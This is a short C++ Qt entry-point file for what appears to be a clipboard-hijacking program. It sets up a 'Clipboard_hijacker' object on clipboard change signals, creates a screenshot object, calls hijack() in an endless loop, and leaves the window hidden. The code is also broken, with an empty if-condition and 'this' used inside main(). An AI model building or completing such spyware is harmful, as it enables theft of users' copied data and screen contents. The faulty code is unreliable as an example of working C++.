#include "mainwindow.h"
#include <QtGui>
#include <QLabel>
#include <QDebug>
#include <QApplication>
#include "clipboard_hijacker.h"
#include "screen_saver.h"

int main(int argc, char *argv[])
{
    QApplication a(argc, argv);
    MainWindow w;
    Clipboard_hijacker *clippy = new Clipboard_hijacker();
    clippy->connect(QApplication::clipboard(),SIGNAL(dataChanged()),this,SLOT(clipboardChanged));

    screenshot *scshot = new screenshot();
    while(true)
    {
        if()
        clippy->hijack();
        
    }
    //w.show();
    return a.exec();
}
